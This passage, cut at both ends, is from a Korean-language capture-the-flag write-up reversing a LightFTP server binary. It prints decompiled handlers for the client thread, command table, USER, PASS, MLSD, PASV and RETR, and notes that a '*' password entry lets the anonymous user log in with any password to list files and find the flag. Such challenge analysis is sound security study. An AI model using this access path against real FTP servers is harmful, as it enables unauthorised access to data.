= inet_ntoa(stru_10120); __printf_chk(1LL, \u0026#34;Interface mask : %s\\r\\n\u0026#34;, v9); v10 = inet_ntoa(stru_1011C); __printf_chk(1LL, \u0026#34;External ipv4 : %s\\r\\n\u0026#34;, v10); __printf_chk(1LL, \u0026#34;Port : %u\\r\\n\u0026#34;, (unsigned __int16)word_10110); __printf_chk(1LL, \u0026#34;Max users : %u\\r\\n\u0026#34;, (unsigned int)dword_10108); __printf_chk(1LL, \u0026#34;PASV port range : %u..%u\\r\\n\u0026#34;, (unsigned __int16)word_10112, (unsigned __int16)word_10114); __printf_chk(1LL, \u0026#34;\\r\\n TYPE q or Ctrl+C to terminate \u0026gt;\\r\\n\u0026#34;); ftp_tls_init(); v12[0] = 0LL; if ( pthread_create(v12, 0LL, ftpmain, 0LL) ) { __printf_chk(1LL, \u0026#34;Error: Failed to create main server thread\\r\\n\u0026#34;); } else { do { v11 = getc(stdin); sleep(1u); } while ( (v11 \u0026amp; 0xFFFFFFDF) != \u0026#39;Q\u0026#39; ); } goto LABEL_28; } } lseek64(v7, 0LL, 2); goto LABEL_22; } 그냥 서버에서 화면? status? 띄워주는 함수다. 클라이언트랑은 상관없으니까 패스하고, ftpmain 함수부터 보면된다.\nvoid *__fastcall ftpmain(void *a1) { int v1; // eax int v2; // r12d _DWORD *v3; // rbp unsigned int v4; // eax __int64 v5; // rdx int v6; // r15d int *v7; // r14 int optval; // [rsp+10h] [rbp-68h] BYREF socklen_t addr_len; // [rsp+14h] [rbp-64h] BYREF pthread_t v11; // [rsp+18h] [rbp-60h] BYREF struct sockaddr addr; // [rsp+20h] [rbp-58h] BYREF unsigned __int64 v13; // [rsp+38h] [rbp-40h] v13 = __readfsqword(0x28u); v1 = socket(2, 1, 6); if ( v1 == -1 ) { __printf_chk(1LL, \u0026#34;\\r\\n socket create error\\r\\n\u0026#34;); } else { v2 = v1; optval = 1; setsockopt(v1, 1, 2, \u0026amp;optval, 4u); v3 = (_DWORD *)x_malloc(4LL * (unsigned int)dword_10108); if ( dword_10108 ) { v4 = 0; do { v5 = v4++; v3[v5] = -1; } while ( dword_10108 \u0026gt; v4 ); } addr.sa_family = 2; *(_QWORD *)\u0026amp;addr.sa_data[6] = 0LL; *(_WORD *)addr.sa_data = __ROL2__(word_10110, 8); *(struct in_addr *)\u0026amp;addr.sa_data[2] = in; if ( bind(v2, \u0026amp;addr, 0x10u) ) { __printf_chk(1LL, \u0026#34;\\r\\n Failed to start server. Can not bind to address\\r\\n\\r\\n\u0026#34;); free(v3); close(v2); } else { writelogentry(0LL, \u0026#34;220 LightFTP server ready\\r\\n\u0026#34;, \u0026#34;\u0026#34;); if ( !listen(v2, 4096) ) { while ( 1 ) { while ( 1 ) { do { addr_len = 16; addr = 0LL; v6 = accept(v2, \u0026amp;addr, \u0026amp;addr_len); } while ( v6 == -1 ); optval = -1; if ( !dword_10108 ) break; v7 = v3; while ( *v7 != -1 ) { if ( ++v7 == \u0026amp;v3[dword_10108] ) goto LABEL_16; } if ( dword_1010C ) socket_set_keepalive(v6); *v7 = v6; optval = pthread_create(\u0026amp;v11, 0LL, ftp_client_thread, v7); if ( optval ) { *v7 = -1; if ( optval ) break; } } LABEL_16: send(v6, \u0026#34;MAXIMUM ALLOWED USERS CONNECTED\\r\\n\u0026#34;, 0x21uLL, 0x4000); close(v6); } } free(v3); close(v2); } } return 0LL; } 마찬가지로 ftp_client_thread만 보면된다.\n// positive sp value has been detected, the output may be wrong! void *__fastcall ftp_client_thread(int *a1) { int v1; // edi __int64 v2; // rbp unsigned __int8 v4; // bl const unsigned __int16 **v5; // rax __int64 v6; // rdx const char *v7; // rbp __int64 v8; // rax size_t v9; // r13 char *v10; // rax char *v11; // rdx const char **v12; // r12 int v13; // ebx int v14; // ebp float v15; // xmm1_4 double v16; // xmm1_8 float v17; // xmm0_4 int *v18; // [rsp-100h] [rbp-6130h] char *v19; // [rsp-F8h] [rbp-6128h] pthread_mutexattr_t *v20; // [rsp-F0h] [rbp-6120h] socklen_t v21; // [rsp-DCh] [rbp-610Ch] BYREF void *v22; // [rsp-D8h] [rbp-6108h] BYREF pthread_mutexattr_t v23; // [rsp-CCh] [rbp-60FCh] BYREF struct sockaddr v24; // [rsp-C8h] [rbp-60F8h] BYREF pthread_mutex_t mutex; // [rsp-B8h] [rbp-60E8h] BYREF int v26; // [rsp-90h] [rbp-60C0h] int v27; // [rsp-8Ch] [rbp-60BCh] pthread_t v28; // [rsp-88h] [rbp-60B8h] __int64 v29; // [rsp-80h] [rbp-60B0h] int v30; // [rsp-78h] [rbp-60A8h] int v31; // [rsp-74h] [rbp-60A4h] int v32; // [rsp-70h] [rbp-60A0h] __int16 v33; // [rsp-6Ch] [rbp-609Ch] int v34; // [rsp-68h] [rbp-6098h] int v35; // [rsp-64h] [rbp-6094h] unsigned __int32 v36; // [rsp-5Ch] [rbp-608Ch] char v37; // [rsp-40h] [rbp-6070h] char v38; // [rsp+0h] [rbp-6030h] BYREF __int64 v39; // [rsp+1000h] [rbp-5030h] BYREF __int64 v40; // [rsp+4FC0h] [rbp-1070h] __int64 v41; // [rsp+4FC8h] [rbp-1068h] __int64 v42; // [rsp+4FD0h] [rbp-1060h] size_t v43; // [rsp+4FD8h] [rbp-1058h] size_t v44; // [rsp+4FE0h] [rbp-1050h] __int64 instr_recved[521]; // [rsp+4FE8h] [rbp-1048h] BYREF while ( \u0026amp;v38 != (char *)(\u0026amp;v39 - 3072) ) ; v18 = a1; instr_recved[513] = __readfsqword(0x28u); memset(\u0026amp;mutex, 0, 0x50A0uLL); v1 = *a1; v21 = 16; v26 = v1; v24 = 0LL; if ( !getsockname(v1, \u0026amp;v24, \u0026amp;v21) ) { v21 = 16; v30 = *(_DWORD *)\u0026amp;v24.sa_data[2]; v24 = 0LL; if ( !getpeername(v26, \u0026amp;v24, \u0026amp;v21) ) { v35 = 0; v31 = *(_DWORD *)\u0026amp;v24.sa_data[2]; v29 = 0xFFFFFFFFLL; v27 = -1; v36 = _InterlockedIncrement(\u0026amp;g_newid); v34 = -1; pthread_mutexattr_init(\u0026amp;v23); pthread_mutexattr_settype(\u0026amp;v23, 1); pthread_mutex_init(\u0026amp;mutex, \u0026amp;v23); v37 = 47; if ( v40 ) ((void (__fastcall *)(__int64, const char *, __int64))gnutls_record_send)( v40, \u0026#34;220 LightFTP server ready\\r\\n\u0026#34;, 27LL); else send(v26, \u0026#34;220 LightFTP server ready\\r\\n\u0026#34;, 0x1BuLL, 0x4000); memset(instr_recved, 0, 0x1000uLL); ((void (__fastcall *)(__int64 *, __int64, __int64, __int64, const char *, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))__snprintf_chk)( instr_recved, 4096LL, 1LL, 4096LL, \u0026#34;\u0026lt;- New user IP=%u.%u.%u.%u:%u\u0026#34;, (unsigned __int8)v24.sa_data[2], (unsigned __int8)v24.sa_data[3], (unsigned __int8)v24.sa_data[4], HIBYTE(*(_DWORD *)\u0026amp;v24.sa_data[2]), (unsigned __int16)__ROL2__(*(_WORD *)v24.sa_data, 8)); writelogentry((__int64)\u0026amp;mutex, (__int64)instr_recved, (__int64)\u0026#34;\u0026#34;); do { LABEL_10: if ( v26 == -1 || !(unsigned int)recvcmd_part_0((__int64)\u0026amp;mutex, (char *)instr_recved, 0x1000LL) )// recvuntil \\r\\n break; v4 = instr_recved[0]; if ( LOBYTE(instr_recved[0]) ) { v5 = __ctype_b_loc(); v6 = 0LL; while ( ((*v5)[(char)v4] \u0026amp; 0x400) == 0 ) { ++v6; v4 = *((_BYTE *)instr_recved + v6); if ( !v4 ) { v7 = (char *)instr_recved + v6; goto LABEL_41; } } v7 = (char *)instr_recved + v6; v8 = v6; if ( (v4 \u0026amp; 0xDF) != 0 ) { do { ++v8; v4 = *((_BYTE *)instr_recved + v8); } while ( (v4 \u0026amp; 0xDF) != 0 ); v9 = v8 - v6; } else { v9 = 0LL; } while ( v4 == \u0026#39; \u0026#39; ) { ++v8; v4 = *((_BYTE *)instr_recved + v8); } v10 = (char *)instr_recved + v8; // Second Arg? v11 = 0LL; if ( v4 ) v11 = v10; v19 = v11; } else { v7 = (const char *)instr_recved; LABEL_41: v19 = 0LL; v9 = 0LL; } v12 = (const char **)\u0026amp;ftpprocs; v13 = 0; while ( strncasecmp(v7, *v12, v9) ) // instruction parsing { ++v13; v12 += 2; if ( v13 == 0x20 ) // instruction cnts -\u0026gt; 32 { writelogentry((__int64)\u0026amp;mutex, (__int64)\u0026#34; @@ CMD: \u0026#34;, (__int64)instr_recved); if ( v40 ) ((void (__fastcall *)(__int64, const char *, __int64))gnutls_record_send)( v40, \u0026#34;500 Syntax error, command unrecognized.\\r\\n\u0026#34;, 41LL); else send(v26, \u0026#34;500 Syntax error, command unrecognized.\\r\\n\u0026#34;, 0x29uLL, 0x4000); goto LABEL_10; } } v14 = ((__int64 (__fastcall *)(pthread_mutex_t *, char *))(\u0026amp;ftpprocs)[2 * v13 + 1])(\u0026amp;mutex, v19);// CALL FTP USR if ( v13 == 0xD ) writelogentry((__int64)\u0026amp;mutex, (__int64)\u0026#34; @@ CMD: \u0026#34;, (__int64)\u0026#34;PASS ***\u0026#34;); else writelogentry((__int64)\u0026amp;mutex, (__int64)\u0026#34; @@ CMD: \u0026#34;, (__int64)instr_recved); } while ( v14 \u0026gt; 0 ); v22 = 0LL; if ( !(_DWORD)v29 ) { HIDWORD(v29) = 1; sleep(2u); if ( pthread_join(v28, \u0026amp;v22) ) { writelogentry((__int64)\u0026amp;mutex, (__int64)\u0026#34;Enter cancel\u0026#34;, (__int64)\u0026#34;\u0026#34;); pthread_cancel(v28); } LODWORD(v29) = -1; } if ( v27 != -1 ) { close(v27); v27 = -1; } if ( v34 != -1 ) { close(v34); v34 = -1; } v32 = 0; v33 = 0; pthread_mutex_destroy(\u0026amp;mutex); pthread_mutexattr_destroy(v20); if ( v42 \u0026lt; 0 ) v15 = (float)(v42 \u0026amp; 1 | (unsigned int)((unsigned __int64)v42 \u0026gt;\u0026gt; 1)) + (float)(v42 \u0026amp; 1 | (unsigned int)((unsigned __int64)v42 \u0026gt;\u0026gt; 1)); else v15 = (float)(int)v42; v16 = (float)(v15 * 0.00000095367432); if ( v41 \u0026lt; 0 ) v17 = (float)(v41 \u0026amp; 1 | (unsigned int)((unsigned __int64)v41 \u0026gt;\u0026gt; 1)) + (float)(v41 \u0026amp; 1 | (unsigned int)((unsigned __int64)v41 \u0026gt;\u0026gt; 1)); else v17 = (float)(int)v41; ((void (*)(__int64 *, __int64, __int64, __int64, const char *, ...))__snprintf_chk)( instr_recved, 4096LL, 1LL, 4096LL, \u0026#34; User disconnected. \\n\u0026#34; \u0026#34;==== Session %u statistics ====\\n\u0026#34; \u0026#34;Rx: %zd bytes (%f MBytes) total received by server in %zd files,\\n\u0026#34; \u0026#34;Tx: %zd bytes (%f MBytes) total sent to the client in %zd files.\\n\u0026#34;, v36, v41, (float)(v17 * 0.00000095367432), v43, v42, v16, v44); writelogentry((__int64)\u0026amp;mutex, (__int64)instr_recved, (__int64)\u0026#34;\u0026#34;); } } v2 = v40; if ( v40 ) { ((void (__fastcall *)(__int64, _QWORD))gnutls_bye)(v40, 0LL); ((void (__fastcall *)(__int64))gnutls_deinit)(v2); } close(v26); *v18 = -1; return 0LL; } recvcmd_part_0 함수는 \\r\\n으로 끝나는 명령어가 오면, instruction operand로 잘 분리해서 저장해주고, 함수를 호출한다.\n.data.rel.ro:000000000000F8E0 ftpprocs dq offset aUser_0 ; DATA XREF: ftp_client_thread:loc_9A3E↑o .data.rel.ro:000000000000F8E0 ; ftp_client_thread+326↑o .data.rel.ro:000000000000F8E0 ; \u0026#34;USER\u0026#34; .data.rel.ro:000000000000F8E8 dq offset ftpUSER .data.rel.ro:000000000000F8F0 dq offset aQuit+1 ; \u0026#34;QUIT\u0026#34; .data.rel.ro:000000000000F8F8 dq offset ftpQUIT .data.rel.ro:000000000000F900 dq offset aNoop ; \u0026#34;NOOP\u0026#34; .data.rel.ro:000000000000F908 dq offset ftpNOOP .data.rel.ro:000000000000F910 dq offset aPwd ; \u0026#34;PWD\u0026#34; .data.rel.ro:000000000000F918 dq offset ftpPWD .data.rel.ro:000000000000F920 dq offset aType ; \u0026#34;TYPE\u0026#34; .data.rel.ro:000000000000F928 dq offset ftpTYPE .data.rel.ro:000000000000F930 dq offset aPort_0 ; \u0026#34;PORT\u0026#34; .data.rel.ro:000000000000F938 dq offset ftpPORT .data.rel.ro:000000000000F940 dq offset aList+1 ; \u0026#34;LIST\u0026#34; .data.rel.ro:000000000000F948 dq offset ftpLIST .data.rel.ro:000000000000F950 dq offset aCdup+1 ; \u0026#34;CDUP\u0026#34; .data.rel.ro:000000000000F958 dq offset ftpCDUP .data.rel.ro:000000000000F960 dq offset aCwd_0 ; \u0026#34;CWD\u0026#34; .data.rel.ro:000000000000F968 dq offset ftpCWD .data.rel.ro:000000000000F970 dq offset aRetr_0 ; \u0026#34;RETR\u0026#34; .data.rel.ro:000000000000F978 dq offset ftpRETR .data.rel.ro:000000000000F980 dq offset aAbor ; \u0026#34;ABOR\u0026#34; .data.rel.ro:000000000000F988 dq offset ftpABOR .data.rel.ro:000000000000F990 dq offset aDele_0 ; \u0026#34;DELE\u0026#34; .data.rel.ro:000000000000F998 dq offset ftpDELE .data.rel.ro:000000000000F9A0 dq offset aPasv ; \u0026#34;PASV\u0026#34; .data.rel.ro:000000000000F9A8 dq offset ftpPASV .data.rel.ro:000000000000F9B0 dq offset aPass_0 ; \u0026#34;PASS\u0026#34; .data.rel.ro:000000000000F9B8 dq offset ftpPASS .data.rel.ro:000000000000F9C0 dq offset aRest ; \u0026#34;REST\u0026#34; .data.rel.ro:000000000000F9C8 dq offset ftpREST .data.rel.ro:000000000000F9D0 dq offset aSize_0 ; \u0026#34;SIZE\u0026#34; .data.rel.ro:000000000000F9D8 dq offset ftpSIZE .data.rel.ro:000000000000F9E0 dq offset aMkd_0 ; \u0026#34;MKD\u0026#34; .data.rel.ro:000000000000F9E8 dq offset ftpMKD .data.rel.ro:000000000000F9F0 dq offset aRmd ; \u0026#34;RMD\u0026#34; .data.rel.ro:000000000000F9F8 dq offset ftpRMD .data.rel.ro:000000000000FA00 dq offset aStor_0 ; \u0026#34;STOR\u0026#34; .data.rel.ro:000000000000FA08 dq offset ftpSTOR .data.rel.ro:000000000000FA10 dq offset aSyst ; \u0026#34;SYST\u0026#34; .data.rel.ro:000000000000FA18 dq offset ftpSYST .data.rel.ro:000000000000FA20 dq offset aFeat ; \u0026#34;FEAT\u0026#34; .data.rel.ro:000000000000FA28 dq offset ftpFEAT .data.rel.ro:000000000000FA30 dq offset aAppe_0 ; \u0026#34;APPE\u0026#34; .data.rel.ro:000000000000FA38 dq offset ftpAPPE .data.rel.ro:000000000000FA40 dq offset aRnfr_0 ; \u0026#34;RNFR\u0026#34; .data.rel.ro:000000000000FA48 dq offset ftpRNFR .data.rel.ro:000000000000FA50 dq offset aRnto_0 ; \u0026#34;RNTO\u0026#34; .data.rel.ro:000000000000FA58 dq offset ftpRNTO .data.rel.ro:000000000000FA60 dq offset aOpts ; \u0026#34;OPTS\u0026#34; .data.rel.ro:000000000000FA68 dq offset ftpOPTS .data.rel.ro:000000000000FA70 dq offset aMlsd ; \u0026#34;MLSD\u0026#34; .data.rel.ro:000000000000FA78 dq offset ftpMLSD .data.rel.ro:000000000000FA80 dq offset aAuth ; \u0026#34;AUTH\u0026#34; .data.rel.ro:000000000000FA88 dq offset ftpAUTH .data.rel.ro:000000000000FA90 dq offset aPbsz ; \u0026#34;PBSZ\u0026#34; .data.rel.ro:000000000000FA98 dq offset ftpPBSZ .data.rel.ro:000000000000FAA0 dq offset aProt ; \u0026#34;PROT\u0026#34; .data.rel.ro:000000000000FAA8 dq offset ftpPROT .data.rel.ro:000000000000FAB0 dq offset aEpsv ; \u0026#34;EPSV\u0026#34; .data.rel.ro:000000000000FAB8 dq offset ftpEPSV .data.rel.ro:000000000000FAC0 dq offset aHelp_0 ; \u0026#34;HELP\u0026#34; .data.rel.ro:000000000000FAC8 dq offset ftpHELP .data.rel.ro:000000000000FAD0 dq offset aSite ; \u0026#34;SITE\u0026#34; .data.rel.ro:000000000000FAD8 dq offset ftpSITE .data.rel.ro:000000000000FAD8 _data_rel_ro ends .data.rel.ro:000000000000FAD8 이런식으로 string과 함수 주소가 잘 매칭되어있다.\n_BOOL8 __fastcall ftpUSER(char *mutex, char *user_name) { size_t v2; // rdx if ( user_name ) { *((_DWORD *)mutex + 22) = 0; writelogentry((__int64)mutex, (__int64)\u0026#34; USER: \u0026#34;, (__int64)user_name); __snprintf_chk((__int64)(mutex + 0x3078), 0x2000LL, 1LL, 0x2000LL, \u0026#34;331 User %s OK. Password required\\r\\n\u0026#34;); v2 = strlen(mutex + 0x3078); // make string if ( *((_QWORD *)mutex + 0xA0F) ) gnutls_record_send(); else send(*((_DWORD *)mutex + 10), mutex + 0x3078, v2, 0x4000); __strcpy_chk(mutex + 0x3078, user_name, 0x2000uLL); return 1LL; } else if ( *((_QWORD *)mutex + 0xA0F) ) { return gnutls_record_send() \u0026gt;= 0; } else { return send(*((_DWORD *)mutex + 10), \u0026#34;501 Syntax error in parameters or arguments.\\r\\n\u0026#34;, 0x2EuLL, 0x4000) \u0026gt;= 0; } } ftpUSER 함수는 유저 이름 받는 함수이다. 이때 config_parse를 통해서 config 파일에서 그 유저에 대한 접근 권한, root path에 대한 정보를 받아온다. 그 이후 PASS로 비밀번호 인증하라고 한다.\n_BOOL8 __fastcall ftpPASS(__int64 a1, const char *password) { int v2; // eax int v3; // r8d char v5[264]; // [rsp+0h] [rbp-138h] BYREF unsigned __int64 v6; // [rsp+108h] [rbp-30h] v6 = __readfsqword(0x28u); if ( !password ) { if ( *(_QWORD *)(a1 + 0x5078) ) return gnutls_record_send() \u0026gt;= 0; else return send(*(_DWORD *)(a1 + 40), \u0026#34;501 Syntax error in parameters or arguments.\\r\\n\u0026#34;, 0x2EuLL, 0x4000) \u0026gt;= 0; } memset(v5, 0, 0x100uLL); if ( !(unsigned int)config_parse((char *)g_cfg, (const char *)(a1 + 0x3078), \u0026#34;pswd\u0026#34;, v5, (char *)\u0026amp;qword_100)// a, pswd, || strcmp(v5, password) \u0026amp;\u0026amp; v5[0] != \u0026#39;*\u0026#39; ) { if ( *(_QWORD *)(a1 + 0x5078) ) return gnutls_record_send() \u0026gt;= 0; return send(*(_DWORD *)(a1 + 40), \u0026#34;530 Invalid user name or password.\\r\\n\u0026#34;, 0x24uLL, 0x4000) \u0026gt;= 0; } *(_QWORD *)(a1 + 0x1078) = 0LL; *(_QWORD *)(a1 + 0x2070) = 0LL; memset( (void *)((a1 + 0x1080) \u0026amp; 0xFFFFFFFFFFFFFFF8LL), 0, 8LL * (((_DWORD)a1 + 0x1078 - (((_DWORD)a1 + 0x1080) \u0026amp; 0xFFFFFFF8) + 4096) \u0026gt;\u0026gt; 3)); memset(v5, 0, 0x100uLL); config_parse((char *)g_cfg, (const char *)(a1 + 0x3078), \u0026#34;root\u0026#34;, (_BYTE *)(a1 + 0x1078), \u0026#34;a\u0026#34;); config_parse((char *)g_cfg, (const char *)(a1 + 0x3078), \u0026#34;accs\u0026#34;, v5, (char *)\u0026amp;qword_100); *(_DWORD *)(a1 + 88) = 0; if ( !strcasecmp(v5, \u0026#34;admin\u0026#34;) ) { v2 = 3; LABEL_7: *(_DWORD *)(a1 + 0x58) = v2; writelogentry(a1, (__int64)\u0026#34; PASS-\u0026gt;successful logon\u0026#34;, (__int64)\u0026#34;\u0026#34;); if ( *(_QWORD *)(a1 + 20600) ) return gnutls_record_send() \u0026gt;= 0; return send(*(_DWORD *)(a1 + 40), \u0026#34;230 User logged in, proceed.\\r\\n\u0026#34;, 0x1EuLL, 0x4000) \u0026gt;= 0; } if ( !strcasecmp(v5, \u0026#34;upload\u0026#34;) ) { v2 = 2; goto LABEL_7; } v3 = strcasecmp(v5, \u0026#34;readonly\u0026#34;); v2 = 1; if ( !v3 ) goto LABEL_7; if ( *(_QWORD *)(a1 + 0x5078) ) return gnutls_record_send() \u0026gt;= 0; return send(*(_DWORD *)(a1 + 40), \u0026#34;530 This account is disabled.\\r\\n\u0026#34;, 0x1FuLL, 0x4000) \u0026gt;= 0; } PASS 함수이다. config 파일에서 유저의 비밀번호를 찾고 인증한다. *면 어떤 비밀번호여도 체크가 패스된다. 아까 config 파일에서 있던 anonymous를 유저 이름으로 주고, 아무 비밀번호나 입력하면, ReadOnly 권한으로 ftp 서버에 접속할 수 있다.\n이제 flag 이름을 읽기 위해서 ftp 명령어들을 구글링 해봤다. MLSD가 나와서 그걸 분석해봤다.\n__int64 __fastcall ftpMLSD(pthread_mutex_t *mutex, char *a2) { int owner; // edx int v4; // eax __int64 align; // rdi int v7; // eax pthread_t newthread; // [rsp+8h] [rbp-C0h] BYREF struct stat64 v9; // [rsp+10h] [rbp-B8h] BYREF unsigned __int64 v10; // [rsp+A8h] [rbp-20h] owner = mutex[2].__owner; v10 = __readfsqword(0x28u); if ( !owner ) { if ( !mutex[515].__align ) return send(mutex[1].__lock, \u0026#34;530 Please login with USER and PASS.\\r\\n\u0026#34;, 0x26uLL, 0x4000) \u0026gt;= 0; return gnutls_record_send() \u0026gt;= 0; } if ( !mutex[1].__kind ) { if ( !mutex[515].__align ) return send(mutex[1].__lock, \u0026#34;550 Another action is in progress, use ABOR command first.\\r\\n\u0026#34;, 0x3CuLL, 0x4000) \u0026gt;= 0; return gnutls_record_send() \u0026gt;= 0; } ftp_effective_path((__int64)(\u0026amp;mutex[105].__align + 2), (__int64)\u0026amp;mutex[3], a2, 0x2000uLL, \u0026amp;mutex[310].__size[8]); v4 = stat64(\u0026amp;mutex[310].__size[8], \u0026amp;v9); // get stat of file align = mutex[515].__align; if ( !v4 \u0026amp;\u0026amp; (v9.st_mode \u0026amp; 0xF000) == 0x4000 ) { if ( align ) gnutls_record_send(); else send(mutex[1].__lock, \u0026#34;150 File status okay; about to open data connection.\\r\\n\u0026#34;, 0x36uLL, 0x4000); writelogentry((__int64)mutex, (__int64)\u0026#34; MLSD-LIST \u0026#34;, (__int64)a2); mutex[1].__spins = 0; pthread_mutex_lock(mutex); v7 = pthread_create(\u0026amp;newthread, 0LL, (void *(*)(void *))mlsd_thread, mutex); mutex[1].__kind = v7; if ( v7 ) { if ( mutex[515].__align ) gnutls_record_send(); else send(mutex[1].__lock, \u0026#34;451 Requested action aborted. Local error in processing.\\r\\n\u0026#34;, 0x3AuLL, 0x4000); } else { *(\u0026amp;mutex[1].__align + 1) = newthread; } pthread_mutex_unlock(mutex); return 1LL; } else if ( align ) { return gnutls_record_send() \u0026gt;= 0; } else { return send(mutex[1].__lock, \u0026#34;550 File or directory unavailable.\\r\\n\u0026#34;, 0x24uLL, 0x4000) \u0026gt;= 0; } } mutex로 critical section을 하나의 쓰레드만 진입하도록 해준것 같다. ftp_effective_path 함수로 경로를 얻어오고 stat으로 체크한다. 여기서 쓰레드로 mlsd_thread 함수를 호출한다. 첫번째 인자는 mutex 그대로 넘겨준다.\nvoid *__fastcall mlsd_thread(pthread_mutex_t *a1) { int v1; // ebx DIR *v2; // rbp struct dirent64 *v3; // rcx __int64 align; // rdi pthread_mutex_t *v5; // rbx _BYTE fd[12]; // [rsp+14h] [rbp-94h] BYREF __pthread_unwind_buf_t buf; // [rsp+20h] [rbp-88h] BYREF buf.__pad[4] = (void *)__readfsqword(0x28u); pthread_mutex_lock(a1); if ( __sigsetjmp((struct __jmp_buf_tag *)\u0026amp;buf, 0) ) { cleanup_handler(a1); __pthread_unwind_next(\u0026amp;buf); } v1 = 0; __pthread_register_cancel(\u0026amp;buf); *(_DWORD *)\u0026amp;fd[8] = 0; *(_QWORD *)fd = (unsigned int)create_datasocket(a1); if ( *(_DWORD *)fd != -1 ) { if ( !a1[515].__align || (unsigned int)ftp_init_tls_session(\u0026amp;fd[4], *(unsigned int *)fd, 0) ) { v2 = opendir(\u0026amp;a1[310].__size[8]); // open dir if ( v2 ) { do { v3 = readdir64(v2); if ( !v3 ) break; v1 = mlsd_sub(\u0026amp;a1[310].__align + 1, *(unsigned int *)fd, *(_QWORD *)\u0026amp;fd[4], v3); if ( !v1 ) break; } while ( !a1[1].__spins ); closedir(v2); } } if ( *(_QWORD *)\u0026amp;fd[4] ) { gnutls_bye(*(_QWORD *)\u0026amp;fd[4], 0LL); gnutls_deinit(); } } writelogentry((__int64)a1, (__int64)\u0026#34; MLSD complete\u0026#34;, (__int64)\u0026#34;\u0026#34;); align = a1[515].__align; if ( *(_DWORD *)fd != -1 ) { if ( !a1[1].__spins \u0026amp;\u0026amp; v1 ) { if ( !align ) { send(a1[1].__lock, \u0026#34;226 Transfer complete. Closing data connection.\\r\\n\u0026#34;, 0x31uLL, 0x4000); goto LABEL_18; } } else if ( !align ) { send(a1[1].__lock, \u0026#34;426 Connection closed; transfer aborted.\\r\\n\u0026#34;, 0x2AuLL, 0x4000); goto LABEL_18; } gnutls_record_send(); LABEL_18: close(*(int *)fd); a1[1].__count = -1; v5 = a1; goto LABEL_19; } if ( align ) gnutls_record_send(); else send(a1[1].__lock, \u0026#34;451 Requested action aborted. Local error in processing.\\r\\n\u0026#34;, 0x3AuLL, 0x4000); v5 = a1; LABEL_19: v5[1].__kind = -1; __pthread_unregister_cancel(\u0026amp;buf); pthread_mutex_unlock(v5); return 0LL; } create_datasocket으로 데이터 소켓을 따로 연다. 그리고 opendir, readdir을 해주고 datasocket으로 결과를 보내준다.\n__int64 __fastcall mlsd_sub(__int64 a1, int a2, __int64 a3, _BYTE *a4) { __int64 result; // rax size_t v6; // rdx struct tm v7; // [rsp+0h] [rbp-2118h] BYREF struct stat64 v8; // [rsp+40h] [rbp-20D8h] BYREF char file[24]; // [rsp+D0h] [rbp-2048h] BYREF unsigned __int64 v10; // [rsp+20D8h] [rbp-40h] v10 = __readfsqword(0x28u); if ( a4[19] != 46 || (result = 1LL, a4[20]) ) { if ( a4[19] != 46 || a4[20] != 46 || (result = 1LL, a4[21]) ) { __snprintf_chk((__int64)file, 0x2000LL, 1LL, 0x2000LL, \u0026#34;%s/%s\u0026#34;); if ( !lstat64(file, \u0026amp;v8) ) { localtime_r(\u0026amp;v8.st_mtim.tv_sec, \u0026amp;v7); ++v7.tm_mon; __snprintf_chk( (__int64)file, 0x2000LL, 1LL, 0x2000LL, \u0026#34;type=%s;%s=%llu;UNIX.mode=%lo;UNIX.owner=%lu;UNIX.group=%lu;modify=%u%02u%02u%02u%02u%02u; %s\\r\\n\u0026#34;); } v6 = strlen(file); if ( a3 ) return gnutls_record_send() \u0026gt;= 0; else return send(a2, file, v6, 0x4000) \u0026gt;= 0; } } return result; } mlsd_sub 함수가 결과를 보내주는 역할을 한다.\n_BOOL8 __fastcall ftpPASV(__int64 a1) { size_t v1; // rdx if ( *(_DWORD *)(a1 + 88) ) { if ( *(_DWORD *)(a1 + 56) ) { if ( (unsigned int)pasv_part_0() ) { __snprintf_chk(a1 + 12408, 0x2000LL, 1LL, 0x2000LL, \u0026#34;227 Entering Passive Mode (%u,%u,%u,%u,%u,%u).\\r\\n\u0026#34;); writelogentry(a1, (__int64)\u0026#34; entering passive mode\u0026#34;, (__int64)\u0026#34;\u0026#34;); v1 = strlen((const char *)(a1 + 12408)); if ( *(_QWORD *)(a1 + 20600) ) return gnutls_record_send() \u0026gt;= 0; else return send(*(_DWORD *)(a1 + 40), (const void *)(a1 + 12408), v1, 0x4000) \u0026gt;= 0; } else { return 1LL; } } else { if ( *(_QWORD *)(a1 + 20600) ) gnutls_record_send(); else send(*(_DWORD *)(a1 + 40), \u0026#34;550 Another action is in progress, use ABOR command first.\\r\\n\u0026#34;, 0x3CuLL, 0x4000); return 1LL; } } else { if ( *(_QWORD *)(a1 + 20600) ) gnutls_record_send(); else send(*(_DWORD *)(a1 + 40), \u0026#34;530 Please login with USER and PASS.\\r\\n\u0026#34;, 0x26uLL, 0x4000); return 1LL; } } ftp 패시브 모드가 구현된 함수다. 포트를 열어주고 유저가 특정 포트로 접속해서 데이터를 받는 형식이다.\n_BOOL8 __fastcall ftpRETR(pthread_mutex_t *mutex, __int64 a2) { int owner; // edx int lock; // edi int v5; // eax __int64 align; // rdi int v8; // eax pthread_t newthread; // [rsp+8h] [rbp-C0h] BYREF struct stat64 v10; // [rsp+10h] [rbp-B8h] BYREF unsigned __int64 v11; // [rsp+A8h] [rbp-20h] owner = mutex[2].__owner; v11 = __readfsqword(0x28u); if ( !owner ) { if ( !mutex[515].__align ) return send(mutex[1].__lock, \u0026#34;530 Please login with USER and PASS.\\r\\n\u0026#34;, 0x26uLL, 0x4000) \u0026gt;= 0; return gnutls_record_send() \u0026gt;= 0; } if ( !mutex[1].__kind ) { if ( !mutex[515].__align ) return send(mutex[1].__lock, \u0026#34;550 Another action is in progress, use ABOR command first.\\r\\n\u0026#34;, 0x3CuLL, 0x4000) \u0026gt;= 0; return gnutls_record_send() \u0026gt;= 0; } if ( !a2 ) { if ( !mutex[515].__align ) return send(mutex[1].__lock, \u0026#34;501 Syntax error in parameters or arguments.\\r\\n\u0026#34;, 0x2EuLL, 0x4000) \u0026gt;= 0; return gnutls_record_send() \u0026gt;= 0; } lock = mutex[2].__lock; if ( lock != -1 ) { close(lock); mutex[2].__lock = -1; } ftp_effective_path(\u0026amp;mutex[105].__align + 2, \u0026amp;mutex[3], a2, 0x2000LL, \u0026amp;mutex[310].__align + 1); v5 = stat64(\u0026amp;mutex[310].__size[8], \u0026amp;v10); align = mutex[515].__align; if ( v5 || (v10.st_mode \u0026amp; 0xF000) == 0x4000 ) { if ( align ) return gnutls_record_send() \u0026gt;= 0; else return send(mutex[1].__lock, \u0026#34;550 File or directory 